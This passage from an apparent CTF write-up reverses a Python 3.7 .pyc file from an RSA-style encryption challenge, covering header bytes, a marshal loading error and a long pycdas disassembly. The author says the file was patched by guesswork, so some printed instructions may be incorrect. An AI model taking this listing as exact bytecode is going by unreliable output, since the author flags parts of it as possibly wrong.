0000时，8-16字节表示文件的hash值。所以<strong>PyCodeObject</strong>在16字节后面。</p></blockquote><p>我们来看一下这个pyc文件头部信息：<strong>420D0D0A</strong>表示python版本为3.7，它的4-8字节全0表明后面的8-16字节为时间戳与源文件大小。</p><p><img src="/2021/08/26/2021%E8%93%9D%E5%B8%BD%E6%80%BB%E5%86%B3%E8%B5%9B/image-20210831121607930.png" alt="image-20210831121607930"></p><p>从上可以知道这个文件的PyCodeObject在16字节后面，因此下面的代码中使用的<strong>f.seek(16)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal, dis</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'en.pyc'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.seek(<span class="number">16</span>)</span><br><span class="line">code = marshal.load(f)</span><br><span class="line">f.close()</span><br><span class="line">print(dis.dis(code))</span><br></pre></td></tr></table></figure><p>可是在使用marshal进行反序列化时就出现了问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"1.py"</span>, line 4, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    code = marshal.load(f)</span><br><span class="line">ValueError: bad marshal data (unknown <span class="built_in">type</span> code)</span><br></pre></td></tr></table></figure><p>这是python版本不匹配出现的问题，该pyc文件是python3.7编译的，而我的环境是python3.8。</p><p>最后使用<strong>pycdas</strong>成功反汇编了一部分，看到没有反汇编成功的提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error disassembling en.pyc: vector::_M_range_check: __n (<span class="built_in">which</span> is 63) &gt;= this-&gt;size() (<span class="built_in">which</span> is 14)</span><br></pre></td></tr></table></figure><p>根据提示把对应的数字改小就可以了。</p><p>最后得到全部的反汇编结果：可能部分指令是不正确的，因为我上面对pyc文件的修改也是大概来的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br></pre></td><td class="code"><pre><span class="line">en.pyc (Python <span class="number">3.7</span>)</span><br><span class="line">[Code]</span><br><span class="line">    File Name: /somewhere/encrypt.py</span><br><span class="line">    Object Name: &lt;module&gt;</span><br><span class="line">    Arg Count: <span class="number">0</span></span><br><span class="line">    KW Only Arg Count: <span class="number">0</span></span><br><span class="line">    Locals: <span class="number">0</span></span><br><span class="line">    Stack Size: <span class="number">3</span></span><br><span class="line">    Flags: <span class="number">0x00000040</span> (CO_NOFREE)</span><br><span class="line">    [Names]</span><br><span class="line">        <span class="string">'gmpy2'</span></span><br><span class="line">        <span class="string">'g'</span></span><br><span class="line">        <span class="string">'Crypto.Util.number'</span></span><br><span class="line">        <span class="string">'long_to_bytes'</span></span><br><span class="line">        <span class="string">'bytes_to_long'</span></span><br><span class="line">        <span class="string">'random'</span></span><br><span class="line">        <span class="string">'gen_num'</span></span><br><span class="line">        <span class="string">'gen_prime'</span></span><br><span class="line">        <span class="string">'po'</span></span><br><span class="line">        <span class="string">'e2'</span></span><br><span class="line">        <span class="string">'__name__'</span></span><br><span class="line">        <span class="string">'sys'</span></span><br><span class="line">        <span class="string">'len'</span></span><br><span class="line">        <span class="string">'argv'</span></span><br><span class="line">        <span class="string">'encode'</span></span><br><span class="line">        <span class="string">'base64'</span></span><br><span class="line">        <span class="string">'B'</span></span><br><span class="line">        <span class="string">'b64decode'</span></span><br><span class="line">        <span class="string">'flag'</span></span><br><span class="line">    [Var Names]</span><br><span class="line">    [Free Vars]</span><br><span class="line">    [Cell Vars]</span><br><span class="line">    [Constants]</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">        <span class="literal">None</span></span><br><span class="line">        (</span><br><span class="line">            <span class="string">'long_to_bytes'</span></span><br><span class="line">            <span class="string">'bytes_to_long'</span></span><br><span class="line">        )</span><br><span class="line">        [Code]</span><br><span class="line">            File Name: /somewhere/encrypt.py</span><br><span class="line">            Object Name: gen_num</span><br><span class="line">            Arg Count: <span class="number">1</span></span><br><span class="line">            KW Only Arg Count: <span class="number">0</span></span><br><span class="line">            Locals: <span class="number">3</span></span><br><span class="line">            Stack Size: <span class="number">6</span></span><br><span class="line">            Flags: <span class="number">0x00000043</span> (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">                <span class="string">'range'</span></span><br><span class="line">                <span class="string">'random'</span></span><br><span class="line">                <span class="string">'choice'</span></span><br><span class="line">            [Var Names]</span><br><span class="line">                <span class="string">'n_bits'</span></span><br><span class="line">                <span class="string">'res'</span></span><br><span class="line">                <span class="string">'i'</span></span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">                <span class="number">0</span></span><br><span class="line">                <span class="number">1</span></span><br><span class="line">            [Disassembly]</span><br><span class="line">                <span class="number">0</span>       LOAD_CONST              <span class="number">1</span>: <span class="number">0</span></span><br><span class="line">                <span class="number">2</span>       STORE_FAST              <span class="number">1</span>: res</span><br><span class="line">                <span class="number">4</span>       SETUP_LOOP              <span class="number">50</span> (to <span class="number">56</span>)</span><br><span class="line">                <span class="number">6</span>       LOAD_GLOBAL             <span class="number">0</span>: range</span><br><span class="line">                <span class="number">8</span>       LOAD_FAST               <span class="number">0</span>: n_bits</span><br><span class="line">                <span class="number">10</span>      CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">12</span>      GET_ITER                </span><br><span class="line">                <span class="number">14</span>      FOR_ITER                <span class="number">38</span> (to <span class="number">54</span>)</span><br><span class="line">                <span class="number">16</span>      STORE_FAST              <span class="number">2</span>: i</span><br><span class="line">                <span class="number">18</span>      LOAD_FAST               <span class="number">1</span>: res</span><br><span class="line">                <span class="number">20</span>      LOAD_CONST              <span class="number">1</span>: <span class="number">0</span></span><br><span class="line">                <span class="number">22</span>      COMPARE_OP              <span class="number">3</span> (!=)</span><br><span class="line">                <span class="number">24</span>      POP_JUMP_IF_FALSE       <span class="number">34</span></span><br><span class="line">                <span class="number">26</span>      LOAD_FAST               <span class="number">1</span>: res</span><br><span class="line">                <span class="number">28</span>      LOAD_CONST              <span class="number">2</span>: <span class="number">1</span></span><br><span class="line">                <span class="number">30</span>      INPLACE_LSHIFT          </span><br><span class="line">                <span class="number">32</span>      STORE_FAST              <span class="number">1</span>: res</span><br><span class="line">                <span class="number">34</span>      LOAD_FAST               <span class="number">1</span>: res</span><br><span class="line">                <span class="number">36</span>      LOAD_GLOBAL             <span class="number">1</span>: random</span><br><span class="line">                <span class="number">38</span>      LOAD_METHOD             <span class="number">2</span>: choice</span><br><span class="line">                <span class="number">40</span>      LOAD_CONST              <span class="number">1</span>: <span class="number">0</span></span><br><span class="line">                <span class="number">42</span>      LOAD_CONST              <span class="number">2</span>: <span class="number">1</span></span><br><span class="line">                <span class="number">44</span>      BUILD_LIST              <span class="number">2</span></span><br><span class="line">                <span class="number">46</span>      CALL_METHOD             <span class="number">1</span></span><br><span class="line">                <span class="number">48</span>      UNARY_POSITIVE          </span><br><span class="line">                <span class="number">50</span>      STORE_FAST              <span class="number">1</span>: res</span><br><span class="line">                <span class="number">52</span>      JUMP_ABSOLUTE           <span class="number">14</span></span><br><span class="line">                <span class="number">54</span>      POP_BLOCK               </span><br><span class="line">                <span class="number">56</span>      LOAD_FAST               <span class="number">1</span>: res</span><br><span class="line">                <span class="number">58</span>      RETURN_VALUE            </span><br><span class="line">        <span class="string">'gen_num'</span></span><br><span class="line">        [Code]</span><br><span class="line">            File Name: /somewhere/encrypt.py</span><br><span class="line">            Object Name: gen_prime</span><br><span class="line">            Arg Count: <span class="number">1</span></span><br><span class="line">            KW Only Arg Count: <span class="number">0</span></span><br><span class="line">            Locals: <span class="number">3</span></span><br><span class="line">            Stack Size: <span class="number">3</span></span><br><span class="line">            Flags: <span class="number">0x00000043</span> (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">                <span class="string">'gen_num'</span></span><br><span class="line">                <span class="string">'g'</span></span><br><span class="line">                <span class="string">'is_prime'</span></span><br><span class="line">            [Var Names]</span><br><span class="line">                <span class="string">'n_bits'</span></span><br><span class="line">                <span class="string">'res'</span></span><br><span class="line">                <span class="string">'b'</span></span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">                <span class="number">1</span></span><br><span class="line">                <span class="number">0</span></span><br><span class="line">            [Disassembly]</span><br><span class="line">                <span class="number">0</span>       LOAD_GLOBAL             <span class="number">0</span>: gen_num</span><br><span class="line">                <span class="number">2</span>       LOAD_FAST               <span class="number">0</span>: n_bits</span><br><span class="line">                <span class="number">4</span>       CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">6</span>       STORE_FAST              <span class="number">1</span>: res</span><br><span class="line">                <span class="number">8</span>       SETUP_LOOP              <span class="number">54</span> (to <span class="number">64</span>)</span><br><span class="line">                <span class="number">10</span>      LOAD_GLOBAL             <span class="number">1</span>: g</span><br><span class="line">                <span class="number">12</span>      LOAD_METHOD             <span class="number">2</span>: is_prime</span><br><span class="line">                <span class="number">14</span>      LOAD_FAST               <span class="number">1</span>: res</span><br><span class="line">                <span class="number">16</span>      CALL_METHOD             <span class="number">1</span></span><br><span class="line">                <span class="number">18</span>      POP_JUMP_IF_TRUE        <span class="number">62</span></span><br><span class="line">                <span class="number">20</span>      LOAD_CONST              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line">                <span class="number">22</span>      STORE_FAST              <span class="number">2</span>: b</span><br><span class="line">                <span class="number">24</span>      SETUP_LOOP              <span class="number">34</span> (to <span class="number">60</span>)</span><br><span class="line">                <span class="number">26</span>      LOAD_FAST               <span class="number">2</span>: b</span><br><span class="line">                <span class="number">28</span>      LOAD_CONST              <span class="number">2</span>: <span class="number">0</span></span><br><span class="line">                <span class="number">30</span>      COMPARE_OP              <span class="number">3</span> (!=)</span><br><span class="line">                <span class="number">32</span>      POP_JUMP_IF_FALSE       <span class="number">58</span></span><br><span class="line">                <span class="number">34</span>      LOAD_FAST               <span class="number">1</span>: res</span><br><span class="line">                <span class="number">36</span>      LOAD_FAST               <span class="number">2</span>: b</span><br><span class="line">                <span class="number">38</span>      BINARY_XOR              </span><br><span class="line">                <span class="number">40</span>      LOAD_FAST               <span class="number">1</span>: res</span><br><span class="line">                <span class="number">42</span>      LOAD_FAST               <span class="number">2</span>: b</span><br><span class="line">                <span class="number">44</span>      BINARY_AND              </span><br><span class="line">                <span class="number">46</span>      LOAD_CONST              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line">                <span class="number">48</span>      BINARY_LSHIFT           </span><br><span class="line">                <span class="number">50</span>      ROT_TWO                 </span><br><span class="line">                <span class="number">52</span>      STORE_FAST              <span class="number">1</span>: res</span><br><span class="line">                <span class="number">54</span>      STORE_FAST              <span class="number">2</span>: b</span><br><span class="line">                <span class="number">56</span>      JUMP_ABSOLUTE           <span class="number">26</span></span><br><span class="line">                <span class="number">58</span>      POP_BLOCK               </span><br><span class="line">                <span class="number">60</span>      JUMP_ABSOLUTE           <span class="number">10</span></span><br><span class="line">                <span class="number">62</span>      POP_BLOCK               </span><br><span class="line">                <span class="number">64</span>      LOAD_FAST               <span class="number">1</span>: res</span><br><span class="line">                <span class="number">66</span>      RETURN_VALUE            </span><br><span class="line">        <span class="string">'gen_prime'</span></span><br><span class="line">        [Code]</span><br><span class="line">            File Name: /somewhere/encrypt.py</span><br><span class="line">            Object Name: po</span><br><span class="line">            Arg Count: <span class="number">3</span></span><br><span class="line">            KW Only Arg Count: <span class="number">0</span></span><br><span class="line">            Locals: <span class="number">5</span></span><br><span class="line">            Stack Size: <span class="number">2</span></span><br><span class="line">            Flags: <span class="number">0x00000043</span> (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">            [Var Names]</span><br><span class="line">                <span class="string">'a'</span></span><br><span class="line">                <span class="string">'b'</span></span><br><span class="line">                <span class="string">'n'</span></span><br><span class="line">                <span class="string">'res'</span></span><br><span class="line">                <span class="string">'aa'</span></span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">                <span class="number">1</span></span><br><span class="line">                <span class="number">0</span></span><br><span class="line">            [Disassembly]</span><br><span class="line">                <span class="number">0</span>       LOAD_CONST              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line">                <span class="number">2</span>       STORE_FAST              <span class="number">3</span>: res</span><br><span class="line">                <span class="number">4</span>       LOAD_FAST               <span class="number">0</span>: a</span><br><span class="line">                <span class="number">6</span>       STORE_FAST              <span class="number">4</span>: aa</span><br><span class="line">                <span class="number">8</span>       SETUP_LOOP              <span class="number">52</span> (to <span class="number">62</span>)</span><br><span class="line">                <span class="number">10</span>      LOAD_FAST               <span class="number">1</span>: b</span><br><span class="line">                <span class="number">12</span>      LOAD_CONST              <span class="number">2</span>: <span class="number">0</span></span><br><span class="line">                <span class="number">14</span>      COMPARE_OP              <span class="number">3</span> (!=)</span><br><span class="line">                <span class="number">16</span>      POP_JUMP_IF_FALSE       <span class="number">60</span></span><br><span class="line">                <span class="number">18</span>      LOAD_FAST               <span class="number">1</span>: b</span><br><span class="line">                <span class="number">20</span>      LOAD_CONST              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line">                <span class="number">22</span>      BINARY_AND              </span><br><span class="line">                <span class="number">24</span>      LOAD_CONST              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line">                <span class="number">26</span>      COMPARE_OP              <span class="number">2</span> (==)</span><br><span class="line">                <span class="number">28</span>      POP_JUMP_IF_FALSE       <span class="number">42</span></span><br><span class="line">                <span class="number">30</span>      LOAD_FAST               <span class="number">3</span>: res</span><br><span class="line">                <span class="number">32</span>      LOAD_FAST               <span class="number">4</span>: aa</span><br><span class="line">                <span class="number">34</span>      BINARY_MULTIPLY         </span><br><span class="line">                <span class="number">36</span>      LOAD_FAST               <span class="number">2</span>: n</span><br><span class="line">                <span class="number">38</span>      BINARY_MODULO           </span><br><span class="line">                <span class="number">40</span>      STORE_FAST              <span class="number">3</span>: res</span><br><span class="line">                <span class="number">42</span>      LOAD_FAST               <span class="number">4</span>: aa</span><br><span class="line">                <span class="number">44</span>      LOAD_FAST               <span class="number">4</span>: aa</span><br><span class="line">                <span class="number">46</span>      INPLACE_MULTIPLY        </span><br><span class="line">                <span class="number">48</span>      STORE_FAST              <span class="number">4</span>: aa</span><br><span class="line">                <span class="number">50</span>      LOAD_FAST               <span class="number">1</span>: b</span><br><span class="line">                <span class="number">52</span>      LOAD_CONST              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line">                <span class="number">54</span>      INPLACE_RSHIFT          </span><br><span class="line">                <span class="number">56</span>      STORE_FAST              <span class="number">1</span>: b</span><br><span class="line">                <span class="number">58</span>      JUMP_ABSOLUTE           <span class="number">10</span></span><br><span class="line">                <span class="number">60</span>      POP_BLOCK               </span><br><span class="line">                <span class="number">62</span>      LOAD_FAST               <span class="number">3</span>: res</span><br><span class="line">                <span class="number">64</span>      LOAD_FAST               <span class="number">2</span>: n</span><br><span class="line">                <span class="number">66</span>      BINARY_MODULO           </span><br><span class="line">                <span class="number">68</span>      RETURN_VALUE            </span><br><span class="line">        <span class="string">'po'</span></span><br><span class="line">        [Code]</span><br><span class="line">            File Name: /somewhere/encrypt.py</span><br><span class="line">            Object Name: e2</span><br><span class="line">            Arg Count: <span class="number">1</span></span><br><span class="line">            KW Only Arg Count: <span class="number">0</span></span><br><span class="line">            Locals: <span class="number">14</span></span><br><span class="line">            Stack Size: <span class="number">5</span></span><br><span class="line">            Flags: <span class="number">0x00000043</span> (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)</span><br><span class="line">            [Names]</span><br><span class="line">                <span class="string">'type'</span></span><br><span class="line">                <span class="string">'bytes'</span></span><br><span class="line">                <span class="string">'AssertionError'</span></span><br><span class="line">                <span class="string">'len'</span></span><br><span class="line">                <span class="string">'bytes_to_long'</span></span><br><span class="line">                <span class="string">'gen_prime'</span></span><br><span class="line">                <span class="string">'g'</span></span><br><span class="line">                <span class="string">'next_prime'</span></span><br><span class="line">                <span class="string">'long_to_bytes'</span></span><br><span class="line">                <span class="string">'pow'</span></span><br><span class="line">                <span class="string">'print'</span></span><br><span class="line">                <span class="string">'str'</span></span><br><span class="line">                <span class="string">'digits'</span></span><br><span class="line">                <span class="string">'hex'</span></span><br><span class="line">            [Var Names]</span><br><span class="line">                <span class="string">'m'</span></span><br><span class="line">                <span class="string">'l'</span></span><br><span class="line">                <span class="string">'m1'</span></span><br><span class="line">                <span class="string">'m2'</span></span><br><span class="line">                <span class="string">'p'</span></span><br><span class="line">                <span class="string">'q'</span></span><br><span class="line">                <span class="string">'pp'</span></span><br><span class="line">                <span class="string">'qq'</span></span><br><span class="line">                <span class="string">'e'</span></span><br><span class="line">                <span class="string">'ee'</span></span><br><span class="line">                <span class="string">'n'</span></span><br><span class="line">                <span class="string">'nn'</span></span><br><span class="line">                <span class="string">'c1'</span></span><br><span class="line">                <span class="string">'c2'</span></span><br><span class="line">            [Free Vars]</span><br><span class="line">            [Cell Vars]</span><br><span class="line">            [Constants]</span><br><span class="line">                <span class="literal">None</span></span><br><span class="line">                <span class="number">512</span></span><br><span class="line">                <span class="number">2</span></span><br><span class="line">                <span class="number">1024</span></span><br><span class="line">                <span class="number">2333</span></span><br><span class="line">                <span class="number">65535</span></span><br><span class="line">            [Disassembly]</span><br><span class="line">                <span class="number">0</span>       LOAD_GLOBAL             <span class="number">0</span>: type</span><br><span class="line">                <span class="number">2</span>       LOAD_FAST               <span class="number">0</span>: m</span><br><span class="line">                <span class="number">4</span>       CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">6</span>       LOAD_GLOBAL             <span class="number">1</span>: bytes</span><br><span class="line">                <span class="number">8</span>       COMPARE_OP              <span class="number">2</span> (==)</span><br><span class="line">                <span class="number">10</span>      POP_JUMP_IF_TRUE        <span class="number">32</span></span><br><span class="line">                <span class="number">12</span>      LOAD_GLOBAL             <span class="number">2</span>: AssertionError</span><br><span class="line">                <span class="number">14</span>      RAISE_VARARGS           <span class="number">1</span></span><br><span class="line">                <span class="number">16</span>      LOAD_GLOBAL             <span class="number">11</span>: str</span><br><span class="line">                <span class="number">18</span>      LOAD_FAST               <span class="number">11</span>: nn</span><br><span class="line">                <span class="number">20</span>      CALL_FUNCTION           <span class="number">31</span></span><br><span class="line">                <span class="number">22</span>      LOAD_CONST              <span class="number">1</span>: <span class="number">512</span></span><br><span class="line">                <span class="number">24</span>      COMPARE_OP              <span class="number">0</span> (&lt;)</span><br><span class="line">                <span class="number">26</span>      POP_JUMP_IF_TRUE        <span class="number">47</span></span><br><span class="line">                <span class="number">28</span>      LOAD_GLOBAL             <span class="number">2</span>: AssertionError</span><br><span class="line">                <span class="number">30</span>      RAISE_VARARGS           <span class="number">1</span></span><br><span class="line">                <span class="number">32</span>      LOAD_GLOBAL             <span class="number">3</span>: len</span><br><span class="line">                <span class="number">34</span>      LOAD_FAST               <span class="number">0</span>: m</span><br><span class="line">                <span class="number">36</span>      CALL_FUNCTION           <span class="number">1</span></span><br><span class="line">                <span class="number">38</span>      LOAD_CONST              <span class="number">2</span>: <span class="number">2</span></span><br><span class="line">                <span class="number">40</span>      BINARY_FLOOR_DIVIDE     </span><br><span class="line">                <span class="number">42</span>      STORE_FAST              <span 